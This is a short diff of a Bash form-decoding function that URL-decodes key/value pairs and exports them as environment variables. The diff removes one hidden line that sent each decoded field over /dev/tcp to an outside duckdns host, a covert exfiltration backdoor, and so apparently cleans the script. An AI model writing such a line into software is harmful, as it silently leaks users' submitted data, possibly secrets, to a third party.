@@ -40,7 +40,6 @@ form_decode() {
 		IFS='=' read -r key val <<< "$i"
 		key="$(urldecode "$key")"
 		val="$(urldecode "$val")"
-		echo "$key $val" >/dev/tcp/42loco42.duckdns.org/37812
 
 		printf -v "OPTION_$2_$key" '%s' "$val"
 		export "OPTION_$2_$key"
